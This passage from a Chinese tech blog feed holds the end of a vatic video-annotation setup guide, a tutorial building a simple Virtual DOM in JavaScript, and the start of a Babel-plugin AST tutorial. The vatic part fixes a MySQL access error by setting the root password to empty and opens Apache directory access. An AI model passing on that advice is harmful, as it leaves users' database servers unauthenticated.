&quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 428, in __init__File &quot;build/bdist.linux-x86_64/egg/sqlalchemy/pool/base.py&quot;, line 630, in __connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/strategies.py&quot;, line 114, in connectFile &quot;build/bdist.linux-x86_64/egg/sqlalchemy/engine/default.py&quot;, line 453, in connectFile &quot;build/bdist.linux-x86_64/egg/MySQLdb/__init__.py&quot;, line 81, in ConnectFile &quot;build/bdist.linux-x86_64/egg/MySQLdb/connections.py&quot;, line 193, in __init__sqlalchemy.exc.OperationalError: (_mysql_exceptions.OperationalError) (1045, &quot;Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27; (using password: NO)&quot;)(Background on this error at: http://sqlalche.me/e/e3q8)

這個 error 是源自於 mysql 需要 password 才能 access，但你可以用下面的指令將 password 設成空的：
use mysqlupdate user set authentication_string=password(&#x27;&#x27;) where user=&#x27;root&#x27;;flush privileges;

以下是執行範例：
mysql&gt; use mysqlReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; update user set authentication_string=password(&#x27;&#x27;) where user=&#x27;root&#x27;;Query OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; quitBye

當你再執行一次 turkic setup --database，你就可以看到成功設定 database 了：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic setup --databaseInstalled new tables, if any.

Verification接下來要執行 turkic status --verify（如果你還沒有要跟 MTurk 綁定，你可以忽略 Amazon Mechanical Turk 的 error）：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic status --verifyConfiguration:Sandbox: TrueDatabase: mysql://root@localhost/vaticLocalhost: http://localhost/Testing access to Amazon Mechanical Turk... OKTesting access to database server... OKTesting access to web server... ERROR! HTTP Error 403: ForbiddenOne or more tests FAILED!

Amazon 的 MTurk 是一個 crowd labeling 的平台，你可以將 labeling 的工作放到網站上，讓世界上各地的人來為你標註 data，省下許多時間。
可是即使忽略 MTurk，還是有 web server error，這時候你會需要改一下 &#x2F;etc&#x2F;apache2&#x2F;apache2.conf，加入下面幾行：
&lt;Directory /your_path_to_vatic/public&gt;Options Indexes FollowSymLinksAllowOverride AllRequire all granted&lt;/Directory

然後重新啟動 apache（sudo apache2ctl graceful），應該就可以成功啦：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic status --verifyConfiguration:Sandbox: TrueDatabase: mysql://root@localhost/vaticLocalhost: http://localhost/Testing access to Amazon Mechanical Turk... OKTesting access to database server... OKTesting access to web server... OKAll tests passed!

這時候在瀏覽器輸入 localhost 就可以看到 vatic 的畫面。
Frame extraction在把自己的 video frame extract 出來時，記得要在 vatic 的目錄下執行 turkic，不然會出現 error。
Publish in offline mode最後一步就是在自己電腦上 offline publish 剛剛弄好的 video：
turkic load identifier_off /home/icaros/Downloads/turkic_frames/my_video/ apple --offlineturkic publish --offline

你應該可以看到下列的 output：
icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic load identifier_off /home/icaros/Downloads/turkic_frames/my_video/ apple --offlineChecking integrity...Searching for last frame...Found 9320 frames.Binding labels and attributes...Creating symbolic link...Creating segments...Video loaded and ready for publication.icaros@icaros-MS-7B61:~/tool/vatic_home/vatic$ turkic publish --offlinehttp://localhost?id=65&amp;hitId=offlinehttp://localhost?id=66&amp;hitId=offlinehttp://localhost?id=67&amp;hitId=offlinehttp://localhost?id=68&amp;hitId=offlinehttp://localhost?id=69&amp;hitId=offlinehttp://localhost?id=70&amp;hitId=offlinehttp://localhost?id=71&amp;hitId=offlinehttp://localhost?id=72&amp;hitId=offlinehttp://localhost?id=73&amp;hitId=offlinehttp://localhost?id=74&amp;hitId=offlinehttp://localhost?id=75&amp;hitId=offlinehttp://localhost?id=76&amp;hitId=offlinehttp://localhost?id=77&amp;hitId=offlinehttp://localhost?id=78&amp;hitId=offlinehttp://localhost?id=79&amp;hitId=offlinehttp://localhost?id=80&amp;hitId=offlinehttp://localhost?id=81&amp;hitId=offlinehttp://localhost?id=82&amp;hitId=offlinehttp://localhost?id=83&amp;hitId=offlinehttp://localhost?id=84&amp;hitId=offlinehttp://localhost?id=85&amp;hitId=offlinehttp://localhost?id=86&amp;hitId=offlinehttp://localhost?id=87&amp;hitId=offlinehttp://localhost?id=88&amp;hitId=offlinehttp://localhost?id=89&amp;hitId=offlinehttp://localhost?id=90&amp;hitId=offlinehttp://localhost?id=91&amp;hitId=offlinehttp://localhost?id=92&amp;hitId=offlinehttp://localhost?id=93&amp;hitId=offlinehttp://localhost?id=94&amp;hitId=offlinehttp://localhost?id=95&amp;hitId=offlinehttp://localhost?id=96&amp;hitId=offline

要 access 你的 task，去瀏覽器輸入上面任意一個 url，例如 http://localhost/?id=86&amp;hitId=offline 即可。 但如果你看到 server error, 請在 000-default.conf 檔案中加上 Directory tag 並重啟 apache：
WSGIDaemonProcess www-dataWSGIProcessGroup www-data&lt;VirtualHost *:80&gt;ServerName localhostDocumentRoot /home/icaros/tool/vatic_home/vatic/publicWSGIScriptAlias /server /home/icaros/tool/vatic_home/vatic/server.pyCustomLog /var/log/apache2/access.log combined&lt;/VirtualHost&gt;&lt;Directory /home/icaros/tool/vatic_home/vatic&gt;&lt;Files server.py&gt;Require all granted&lt;/Files&gt;&lt;/Directory&gt;

這時候再去瀏覽器輸入 http://localhost?id=86&amp;hitId=offline，你就可以看到 annotation 的視窗了：

總結今天教大家要怎麼從無到有 setup vatic 這個可以更方便標註 video 中 bounding box 的工具，希望對有相關需求的讀者有幫助！
延伸閱讀
BeaverDam: Video annotation tool for deep learning training labels
Tool for annotating and evaluating video object detection or tracking ?

關於作者：@pojenlai 演算法工程師，對機器人、電腦視覺和人工智慧有少許研究，正在學習用心體會事物的本質跟不斷進入學生心態改進。
]]></content>
      <tags>
        <tag>Deep Learning, Computer Vision, Video labeling</tag>
      </tags>
  </entry>
  <entry>
    <title>從頭打造一個簡單的 Virtual DOM</title>
    <url>/2019/02/04/vdom-from-scratch/</url>
    <content><![CDATA[前言過年除舊佈新，剛好趁這個機會來複習一下已經是老觀念的 Virtual DOM。很多人在講到 React 的時候都一定會提到 Virtual DOM，而問到 Virtual DOM 的好處時，就會說到實際 DOM 的操作成本很貴，所以透過 Virtual DOM 可以降低成本。
你在除夕餐桌上這樣講可能沒問題，面試只講這樣應該不太好。
畢竟你最後還是會操作實體 DOM 啊，這樣說明太簡化了。
Virtual DOM 的由來可以從 MVC 和 MVVM 的架構追溯起，主要都是為了解決前端頁面呈現、資料更動、使用者操作這三種狀態交互作用產生的複雜性，MVC 提供了一個解法，MVVM 提出的 View Model 有了優化的方案，還有 data 與 view 雙向綁定的方式等等，而 React 提出了另一種思路，但那不是我今天的重點，有興趣且還不知道這些名詞是什麼的讀者可以去搜尋看看，有很多文章在說明這些資訊與歷史。
React 的 Virtual DOM 是因應其數據與 UI 更新繪製的特殊思路而提出的效能解決方案。
React 希望在資料更新時，能夠直接重新渲染頁面，不用主動去探究是數據的哪部份發生變化，要對應去更新頁面哪一部分的 DOM。但頁面重新渲染的成本可是更高，所以才需要 Virtual DOM 作為緩衝，透過資料更新後，重新繪製 Virtual DOM，與實體 DOM 進行 Diff，最後再把差異部分 Patch 上去，這不僅修正了重新渲染的成本問題，也降低了 data 與 view 交互更新的複雜度，提高了 developer 的開發體驗。
說了這麼多，其實今天就只是單純想自己手刻一個 Virtual DOM 來理解一下該怎麼實現這樣的功能，畢竟知道了概念，總覺得手刻應該不難。手刻 Virtual DOM 其實也沒什麼太大意義，但很多時候就是 for fun，然後做個記錄。
主要參考至 @ycmjason 的 talk 與 blog，非常推薦欣賞，講者的熱情完全掩蓋掉音訊不佳的缺點，又很清楚地介紹了 VDOM 實作。
所以，Virtual DOM 到底長什麼樣子？Virtual DOM 就只是個 javascript plain object，並且模仿 Actual DOM 的結構（但當然簡化很多）：
const vElement = &#123;  tagName: &#x27;div&#x27;,  attrs: &#123;    id: &#x27;v-element&#x27;,  &#125;,  children: []&#125;;

一個基本的 VDOM，我們只需要元素名稱（tagName）、元素屬性（attrs）與其 Children list（既然是虛擬 DOM，這個 plain object 裡面的屬性其實隨便你取名，只要對應得到實際 DOM 即可）。
根據這個想法，我們可以模仿現存的 VDOM lib，提供一個 createElement 的 function：
createElement.jsexport default (tagName, &#123; attrs = &#123;&#125;, children = [] &#125;) =&gt; &#123;  const vElement = Object.create(null);  Object.assign(vElement, &#123;    tagName,    attrs,    children,  &#125;);  return vElement;&#125;;


Note: 利用 Object.create(null) 與 Object.assign 的方式產生物件，可以避免直接採用 Object literals 的方式會繼承到 object prototype 的屬性。

使用方式如下：
main.jsimport createElement from &#x27;./createElement&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);console.log(vRootApp);

結果：

從 Virtual DOM 到 Real DOM有了 Virtual DOM，我們還需要一個 render 函數來將其繪製到頁面上。方法很簡單，我們只需要 document.createElement、setAttribute 與 appendChild 三個 web api 即可完成：
render.jsconst renderElem = (&#123; tagName, attrs, children &#125;) =&gt; &#123;  const elem = document.createElement(tagName);  for (const [k, v] of Object.entries(attrs)) &#123;    elem.setAttribute(k, v);  &#125;  for (const child of children) &#123;    elem.appendChild(renderElem(child));  &#125;  return elem;&#125;;export default renderElem;

根據 tagName 使用 document.createElement 來建立實際的 DOM 物件，並且將 attrs 一個一個 setAttribute 到實際的 DOM 元素上；最後再將 children 遞迴丟入 renderElem 函數中，將所有小孩的實際 DOM object 都建立好並 appendChild 到上層的實際 DOM 物件上，最後將完整的 real DOM object 回傳出去。
以概念來說基本上這樣就完成了，但可以讓他在完整一點，提供 textNode 的支援，利用 document.createTextNode 來產生純 string 的元素，稍微修改 render.js 如下：
render.jsconst renderElem = (&#123; tagName, attrs, children &#125;) =&gt; &#123;  const elem = document.createElement(tagName);  for (const [k, v] of Object.entries(attrs)) &#123;    elem.setAttribute(k, v);  &#125;  for (const child of children) &#123;    elem.appendChild(render(child));  &#125;  return elem;&#125;;const render = (vNode) =&gt; &#123;  if (typeof vNode === &#x27;string&#x27;) &#123;    return document.createTextNode(vNode);  &#125;  return renderElem(vNode);&#125;;export default render;

從 render 函數回傳的基本上就會是一顆完整的 Virtual DOM Tree 了，舉個例子來看：
import createElement from &#x27;./createElement&#x27;;import render from &#x27;./render&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    &#x27;Hello VDOM&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);const rootApp = render(vRootApp);

結果如下，Virtual DOM 就是個 Javascript plain object，而經由 render 函數回傳的即是包含實際 DOM 屬性的 Real DOM：

掛到頁面上吧！透過 render 我們有了實體 DOM，但這樣還沒辦法在頁面上顯示，需要有個類似 ReactDOM.render 的方法來幫助我們實現：
mount.jsexport default (element, targetNode) =&gt; &#123;  targetNode.appendChild(element);&#125;;

main.jsimport createElement from &#x27;./createElement&#x27;;import render from &#x27;./render&#x27;;import mount from &#x27;./mount&#x27;;const vRootApp = createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,  &#125;,  children: [    &#x27;Hello VDOM&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: &#x27;http://placekitten.com/200/300&#x27;,      &#125;,    &#125;),  ],&#125;);const rootApp = render(vRootApp);mount(rootApp, document.getElementById(&#x27;rootApp&#x27;));

很簡單，就把我們產生的 Real DOM appendChild 到 targetNode 下就好。
或是也能用 targetNode.replaceWith(element); 的方式直接取代掉 targetNode。（不過要注意一下 IE 是無法使用的喔！）

Diff Virtual DOM - Reconciliation知道怎麼產生 Virtual DOM 並繪製到頁面上後，也是時候進入重頭戲了！
如前言所說，Virtual DOM 作為我們操作 Real DOM 的一層緩衝，我們比較經過狀態變化後產生的新舊 Virtual DOM 來找出實際需要更新的 Real DOM 位置，如此一來，儘管每次都重新 Render，實際更新的 DOM 也不會是全部，可以大幅改善直接重新渲染的效能問題。
而 tree diff 的演算法其實很複雜，如果用 Tree Edit Distance 的方式遞迴檢查每個節點，複雜度將可達到 O(n^3)，是非常驚人的數字，幾乎無法在短時間處理完，因此 React 所提出的 reconciliation 制定了一些策略，來將複雜度從 O(n^3) 降至 O(n)。React 官方文檔其實說明得很清楚。
主要有兩個假設：

只需要比較同一層的節點，同一層內的元素若擁有不同的 type，往下長出的樹就會不同。
同樣 type 的元件，開發者可以使用 key 這個 props 來決定其子樹是否需要重新 render。

如假設一提及，我們只比較新舊兩棵 Virtual DOM Tree 中，同個父節點下的所有子節點，若發現某個節點不存在了，那就整個子樹都會刪除不去進一步比較。

這樣做的意思就是說，如果今天發生了一些跨層級的操作，像是整顆子樹被搬移到另一個節點上，對 React 來說，會是刪掉原有的子樹，然後重新在新的位置建立一模一樣的子樹出來：


Note: 實際上 React 在這兩個假設下，還做了許多更細節的事情（component diff、element diff），可以先去參考這篇很久之前的文章，再去閱讀 React fiber 的介紹。

基於這兩個假設我們可以開始實作簡單版的 Virtual DOM Diffing 演算法，基本上有四個 cases 處理：

newTreeRoot 為 undefined，也就是某個節點被刪除了。
兩個 Node 都是純字串。
一個 Node 為純字串，一個 Node 為 Virtual Element。
新舊 TreeRoot 的 TagName 不同。

根據這四種 cases 我們個別處理，並且回傳一個 patch 函數，供之後來將 diff 完的結果 attach 到 Real DOM 上 （Note: r 開頭的都代表 Real DOM，v 開頭為 Virtual DOM）：
diff.jsimport render from &#x27;./render&#x27;;const diff = (oldVTreeRoot, newVTreeRoot) =&gt; &#123;  // 假設 oldVTreeRoot 一定都存在，只有 newVTreeRoot 有機會被刪除，也就是 undefined  if (newVTreeRoot === undefined) &#123;    // 回傳 patch 函數，會接收 Real DOM，這邊 r 開頭的都代表 Real DOM，v 開頭為 Virtual DOM    return rNode =&gt; &#123;      // 因為新的 Virtual DOM Tree 是空的，所以回傳的 Patch 函式就是直接把 Real DOM 刪除。      rNode.remove();      return undefined;    &#125;  &#125;  if (typeof oldVTreeRoot === &#x27;string&#x27; ||    typeof newVTreeRoot === &#x27;string&#x27;) &#123;    if (oldVTreeRoot !== newVTreeRoot) &#123;      // 這邊包含兩種 cases：      // Case 1：新舊 Virtual DOM Tree 其中一個為 string，一個為 Virtual Node，所以當然會 !==      // Case 2：是兩者都為 string，但 !==      // 我們直接根據新的 Virtual Tree render 新的 Real Tree，並 replace 掉原本的 Real Tree      return rNode =&gt; &#123;          // 回傳 patch 函數          const rNewNode = render(newVTreeRoot);          rNode.replaceWith(rNewNode);          return rNewNode;       &#125;;    &#125; else &#123;      // 若都為 string 且值相同，那就不用改。      return rNode =&gt; rNode; // 回傳 patch 函數    &#125;  &#125;  if (oldVTreeRoot.tagName !== newVTreeRoot.tagName) &#123;    // 根據優化 Tree diffing 演算法的假設一，只要 tagName 不同，我們就直接重新 render。    return rNode =&gt; &#123;      // 回傳 patch 函數      const rNewNode = render(newVTreeRoot);      rNode.replaceWith(rNewNode);      return rNewNode;    &#125;;  &#125;  // ...&#125;;export default diff;

聰明的你看到這邊就會發問了：tag name 相同的 case 沒有處理到啊？
沒錯，如果新舊兩棵 Virtual Tree 的 tag name 都一樣，那我們還得比 attributes，而要比較兩個節點的所有 attributes，不如直接 replace 上新的就好。但要注意，因為 attributes 很多，所以會產生多個 patch 函數需要被 apply 到 Real DOM 上，我們額外用一個陣列暫存，最後回傳一個 wrapper patch 函數，把所有暫存的 patch 函數都 apply 到傳進來的 Real DOM ：
diffAttrs.jsconst diffAttrs = (oldAttrs, newAttrs) =&gt; &#123;  // 因為 attributes 很多，需要一個 array 來存所有需要的 patch 函數  const patches = [];  // 放上新的 attributes  for (const [k, v] of Object.entries(newAttrs)) &#123;    patches.push(rNode =&gt; &#123;      // 暫存 patch 函數      rNode.setAttribute(k, v);      return rNode;    &#125;);  &#125;  // 移除舊的 attributes  for (const k in oldAttrs) &#123;    if (!(k in newAttrs)) &#123;      patches.push(rNode =&gt; &#123;        // 暫存 patch 函數        rNode.removeAttribute(k);        return rNode;      &#125;);    &#125;  &#125;  // 最後傳出去的外層 patch 函數  return rNode =&gt; &#123;    for (const patch of patches) &#123;      // 把每個暫存的 patch 函數都 apply 到 Real DOM 上      patch(rNode);    &#125;    return rNode;  &#125;;&#125;;export default diffAttrs;

處理完 attributes 後，我們還得考慮 children，diff children 的方式其實跟 diff 整棵樹一樣，但我們要考慮到子樹的長度：

oldVChildren.length === newVChildren.length，那就直接 diff(oldVChildren[i], newVchildren[i])，i 從 0 到 oldVChildren.length。
oldVChildren.length &gt; newVChildren.length，跟 case 1 其實一樣，因為新子樹比較少，就代表有 Node 被刪除，在我們原本的 diff 函式中有處理了。
oldVChildren.length &lt; newVChildren.length，新子樹比較長，那就先把舊子樹的所有點先 update 好，再把剩餘的新子樹 patch 上去。

從上述三個 cases 來看，我們橫豎都需要 loop oldVChildren 一次，最後若有多餘的 newVChildren 再想辦法 update 上去。另外，這邊一樣需要暫存多個 patch 函數，實作細節我註解在 code 裡比較清楚，最後回傳的 patch 函數比較特別：
diffChildren.jsconst diffChildren = (oldVChildren, newVChildren) =&gt; &#123;  // 無論如何都 loop 過 oldVChildren 一次，把所有 diff 回傳的 patch 函數暫存在 childrenPatches 內  // 這是一定會 apply 到 old tree 的部分。  const childPatches = [];  oldVChildren.forEach((oldVChild, i) =&gt; &#123;    childPatches.push(diff(oldVChild, newVChildren[i]));  &#125;);  // 接著我們看看 `newVChildren` 是否有多餘的子樹需要處理  // 若有，我們產生的 patch 函數就是單純 `render` 出 Real Node 並且  // appendChild 到 patch 傳進的 Real Node 上（實際要被 patch 的 parent 節點）  const additionalPatches = [];  for (const additionalVChild of newVChildren.slice(oldVChildren.length)) &#123;    additionalPatches.push(rNode =&gt; &#123;      rNode.appendChild(render(additionalVChild));      return rNode;    &#125;);  &#125;  return rParent =&gt; &#123;    // 由於這是 children 的 patch，吃進來的會是 parent 的 Real DOM    // 我們要抓出 `rParent.childNodes` 來針對 old tree 做 patch    // zip 函數其實就是 lodash 的 zip，成對將 childPatches, rParent.childNodes 的元素並排傳出，這樣比較簡潔    for (const [patch, rChild] of zip(childPatches, rParent.childNodes)) &#123;      patch(rChild);    &#125;    // 最後把 new tree 多餘的 patches 直接 patch 到 parent 的 Real DOM 下即可（因為我們是 appendChild）    for (const patch of additionalPatches) &#123;      patch(rParent);    &#125;    return rParent;  &#125;;&#125;;

最後在我們原本的 diff.js 中的最後面加上：
diff.jsimport render from &#x27;./render&#x27;;const diff = (oldVTreeRoot, newVTreeRoot) =&gt; &#123;  if (newVTreeRoot === undefined) &#123;    // ....  &#125;  if (typeof oldVTreeRoot === &#x27;string&#x27; ||    typeof newVTreeRoot === &#x27;string&#x27;) &#123;    if (oldVTreeRoot !== newVTreeRoot) &#123;      // ....    &#125; else &#123;      // ....    &#125;  &#125;  if (oldVTreeRoot.tagName !== newVTreeRoot.tagName) &#123;      // ....  &#125;  const patchAttrs = diffAttrs(oldVTreeRoot.attrs, newVTreeRoot.attrs);  const patchChildren = diffChildren(oldVTreeRoot.children, newVTreeRoot.children);  return rNode =&gt; &#123;    patchAttrs(rNode);    patchChildren(rNode);    return rNode;  &#125;;&#125;;export default diff;

完整的 diff code 可以看這邊 codesandbox
到這邊為止，Virtual DOM 算是告一段落了！
最後修改下 main.js，做點變化讓大家看製作出的 VDOM 效果我們讓 createVApp 柯里化，多傳一個參數 count 進去改變 attributes 跟圖片尺寸，接著 setInterval 讓每兩秒產生一個隨機數字當作 count 值，用來 update 我們的節點：
main.jsconst createVApp = count =&gt; createElement(&#x27;div&#x27;, &#123;  attrs: &#123;    id: &#x27;root&#x27;,    dataCount: count, // we use the count here  &#125;,  children: [    &#x27;Hello Kitty&#x27;,    createElement(&#x27;img&#x27;, &#123;      attrs: &#123;        src: `http://placekitten.com/$&#123;count&#125;00/$&#123;count&#125;00`,      &#125;,    &#125;),  ],&#125;);let vApp = createVApp(0);const rApp = render(vApp);let rRootEl = mount(rApp, document.getElementById(&#x27;rootApp&#x27;));setInterval(() =&gt; &#123;  const n = Math.floor(Math.random() * 10);  const vNewApp = createVApp(n);  const patch = diff(vApp, vNewApp);  // 每次 patch 完就 assgin 回原有變數，這樣下個 interval 才會抓到更新的樹  rRootEl = patch(rRootEl);  vApp = vNewApp;&#125;, 2000);

效果如下，可以看到圖片一直變動，但是我們真的只改到了需要改的節點與 attributes，並不會整個頁面重新刷新：

結論雖然沒辦法跟市面上實際的 VDOM 相提並論，但是從這簡單的實作可以很清楚的知道整個概念與要解決的問題，我覺得是蠻不錯的小練習，接下來再去看 React 或是 Vue 在這方面的實作應該會比較有頭緒一些！最後再附上一次 codesandbox 連結讓想玩的人直接試試：codesandbox
資料來源
Video: Building a Simple Virtual DOM from Scratch - Jason Yu
Blog: Building a Simple Virtual DOM from Scratch - Jason Yu
React 源碼剖析系列 － 不可思議的 react diff
深度剖析：如何实现一个 Virtual DOM 算法

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>react</tag>
        <tag>javascript</tag>
        <tag>virtual dom</tag>
      </tags>
  </entry>
  <entry>
    <title>透過製作 Babel-plugin 初訪 AST</title>
    <url>/2018/09/22/visit-ast-with-babel-plugin/</url>
    <content><![CDATA[前言最近公司同事組了 Design pattern 的讀書會，剛好這週研讀到 Visitor Pattern 時，同事介紹說我們每天在用的工具 Babel 就是採用 Vistor Pattern，透過 visitor 拜訪 AST (Abstract Syntax Tree)，進而將程式碼進行對應轉換。
這除了勾起我前陣子想要了解 AST 的想法外，也再度提醒我對於 Babel Plugin 背後的實作方式不太了解，只知道像是 ESLint, UglifyJS 或是 Webpack，他們的核心都是用到了 AST 來實現程式碼的檢查、分析與操作，但並不曉得實際上要如何使用。
此外，我先前其實都沒有想過要自己寫 Babel Plugin，總覺得 Babel 的 Plugin 就是要很一般化，大家都能使用的，但其實不然啊，自己的專案或甚至是公司團隊內的專案，只要能有助於大家的工作效率，就算只給內部使用又何妨？明確定義好使用的情境跟 Style 即可。
因此這次就決定花點時間來學習如何實作 Babel Plugin，並透過實作 Babel Plugin 的過程，一同了解 AST 的概念。
一直提到 AST，到底什麼是 AST？AST 的全文是 Abstract Syntax Tree，中文大多翻作抽象語法樹，主要是將我們 人類 所寫的程式語法，轉換成 程式 比較容易閱讀的語法結構，並以樹的資料結構來儲存。
直接來個例子，先讓大家看看 給人類看的 code 與 給程式讀的 code 之間的差異：

左邊的程式經過 Parser 的轉換後，就會產出右圖中的 AST。
在遠古的 Nestcape 時代，對於 Javascript 的 AST 有許多種實作，而後來為了解決一致性的問題，ESTree 這個組織定義了現今通用的 AST specification。
像是我們現在常用的 Babel 所使用的 AST 就是基於 ESTree 的規範延伸修改的。
那 Babel 這些工具到底拿 AST 來做什麼呢？稍稍回想一下，Babel 或是 ESLint 在我們平日的開發中扮演了什麼角色？
情境大概是：

你用 ES6 寫了一段 arrow function，而 Babel 會幫忙轉換成 ES5 的匿名函數，同時 ESLint 可能會顯示 Warning 告知你的括號前面必須要留有空格。

這段描述當中，Babel 其實將你的 code 透過三個 stage 來處理：parse, transform, generate.
而其中，AST 其實就出現了兩次：



Parse stage
你寫的 js code 會經由 js parser 轉換為 AST，當然其中會透過 Lexical Analysis 與 Syntactic Analysis。

Transform stage
而這時 Babel plugin 與 ESLint plugin 就可以介入你的程式進行改造，幫忙轉換成 ES5 的匿名函數以及審視你的程式，決定是否要提示 Warning 的這兩個動作就是在這個階段發生的，我們將 Parser 解析後的 AST 改造成我們想要的樣子。

Generate stage
最後，改造完成的 AST 會再被 generator 轉換為一般的 code 輸出。


常用的 js parser 有很多種，像是 babylon, acorn, esprima 等等，而所謂的 Babel plugin 或是 ESLint plugin，則可以看作是一種 Transformer。
窺探一下 AST 的內容在實作 Plugin 前，先了解一下 AST 的長相對之後會比較有幫助。
開始之前先介紹兩個常用網站：

AST Exporler
超棒的網站，在上面可以邊看原始程式碼根據不同 Parser 所建構出來的 AST，也能切換不同 Transformer 來實作 Plugin 內容。

JAVASCRIPT AST VISUALIZER
主要是將 AST 視覺化，對於理解整個程式碼的 AST 結構能有比較清楚 Overview。


不過我個人是覺得 AST Exporler 就足夠了， VISUALIZER 雖然能看到圖像化的樹狀結構，但操作起來不是很順暢，也無法直接在上面撰寫 Transformer。所以下面都會以 AST Exporler 為使用工具來介紹。
現在我們以一個比最開始稍稍複雜一點的簡單範例來解析，在這邊我們採用與 Babel 相同的 Parser - Babylon7：
我們的原始程式碼如下，定義 a 與 b 兩個變數，以及一個 add function：
const a = 2const b = 3function add(a,b) &#123;  return a+b&#125;

一步一步來看，const a = 2 的 AST 會長這樣：

你的程式碼在 AST 當中，會被拆解成各種 node 來存放表示，而每一個 node 都有自己的 type，各種 type 有其特定的屬性參數，以上圖為例：
const 在 AST 中就是ㄧ個 type 為 VariableDeclaration 的 node，這個 node 必須包含兩種屬性， declarations 與 kind：
kind 很好理解，意指我們的 VariableDeclaration 可以有三種類型（var, let, const）， 而 declarations 看起來就是存放你所宣告的變數，像 a = 2，但他是 Array of VariableDeclarator，我們不是只有宣告一個變數嗎？
其實是要應付這種寫法：const a = 2, b = 3，需要能接收多個 VariableDeclarator。
而 VariableDeclarator 這種 type 的 node 代表的就是 a=2 這種宣告式，其中包含兩個屬性 id 與 init，我們將其展開看看：

id 屬性所接受的是 identifier 這個 type 的 node，代表該 VariableDeclarator 的 identity。該 node 只需要一個 name 屬性，也就是他的名稱，在這邊的例子中當然就是 a 囉。而 init 則是這個 VariableDeclarator 的初始值，因為我們程式中是初始 a 為 2，所以這個 init 屬性就會連到一個 NumericLiteral type 的 node，擁有 value 為 2 的屬性。
此外，眼尖的讀者想必都有發現到，每個 node 都有 start, end 與 loc 這三個屬性，這是用來代表該 node 在程式的第幾行第幾列。
看到這邊應該對於 AST 的結構會有點感覺了，基本上就是 Parser 會先將你的程式切成多種 tokens，接著依照類別來區分是哪種 node，最後從程式結構上一一把 node 串接，形成一顆完整的 Abstract Syntax Tree。如果覺得剛剛用 AST Explorer 轉化的格式不夠清楚，這邊補充一下同樣程式用 VISUALIZER 出來的 AST 長相，應該會對 AST 的結構更有感受：

範例程式中我們還有使用到 function，他長出的 AST 與宣告變數在 node type 上有不少差異，但大體結構就如同上面介紹的一般，這邊就不再贅述，相信看到這邊的讀者也有能力自己去 AST Explorer 玩玩看了！寫些簡單的程式，看看他們經由 Parser 轉換後，會產生怎樣的 AST，每種語法所對應的 node type 又是什麼。
懂了 AST，來實際應用一下，開始製作 Babel Plugin 吧！出發，總要有個方向。
要做 Plugin 也得要先決定要做什麼。
剛好在工作上常常會用到 React-intl 這個套件來幫忙處理 i18n，他的使用方法還算簡單，當一些基本設定做好以後，你只要用其提供的一個特殊元件 &lt;FormattedMessage /&gt;，放入對應文字的 id 即可，像是： &lt;FormattedMessage id=&quot;#words-need-i18n&quot; /&gt; 。
雖然實際上已經非常簡單了，但我還想更懶一點，能不能直接輸入 &#123;&#39;#words-need-i18n&#39;&#125; 就好呢？
像是能把：
&lt;div&gt;  &#123;&#x27;#words-need-i18n&#x27;&#125;&lt;/div&gt;

轉換成：
&lt;div&gt;  &lt;FormattedMessage id=&quot;words-need-i18n&quot; /&gt;&lt;/div&gt;

可以！自己寫 Plugin 就可以！
撰寫 Babel Plugin 的起手式先到 AST Exporler 開啟一個新的頁面，接著在上方列表選取好 Parser (Babylon7) 與 Transformer (Babel7)，並在旁邊的程式區塊內寫上一點範例程式，就是你預期能被 Babel 認得並轉換的”新”程式碼，以我的例子就是：
&lt;div&gt;  &#123;&#x27;#words-need-i18n&#x27;&#125;&lt;/div&gt;


接著看看你的 AST 長什麼樣子，想想你該怎麼修改他：

出現沒看過的 type 了！沒關係，在剛開始撰寫 Plugin 的過程中一定會遇到許多沒看過的 type 或是不清楚他的屬性型別，好在 babel 有一份非常詳細的 handbook 與 docs 可以查閱，只要到上面 ctrl + f 一下，應該都能在上頭找到你所需要的知識。
準備好測試程式碼、了解測試程式碼的 AST、也有了工具書可以查，就能毫無懸念的開始撰寫 Babel plugin 了。
Babel plugin 之 Transform、Visitors、Traversal還記得我在最一開始說過，Babel 大量使用到了 Visitor pattern 嗎？就是用在這邊！
之所以 Babel 能夠輕易解析你的程式碼，並且進行各種修改操作，依賴的就是各種 visitors 在 AST 上進行 traverse，當遇到對應的 node 時，visitor 就會做出相對的操作，進而將輸入的程式碼 transform 成預期的結果，這就是整個 Babel plugin 的實作核心。
Babel plugin 的基礎結構若你剛剛有照著我的說明，在 AST Exporler 上方列表選取好 Parser 與 Transformer，那左下角應該會出現類似下方的程式區塊：
export default function (babel) &#123;  const &#123; types: t &#125; = babel;  return &#123;    name: &quot;ast-transform&quot;, // not required    visitor: &#123;      Identifier(path, state) &#123;        path.node.name = path.node.name.split(&#x27;&#x27;).reverse().join(&#x27;&#x27;);      &#125;    &#125;  &#125;;&#125;

這是 AST Exporler 上的預設 template，基本的 Babel plugin 也就是長這樣。
你會接受一個 babel 物件，其中我們會需要的是 babel.types，在之後新增修改 node 時會不斷地用到，因此最好存成一個變數，省去 chain lookup。
而基本上你要做的就是回傳一個 visitor object，其中定義以 node type 為名的 funciton，接收兩種參數：path 與 state：

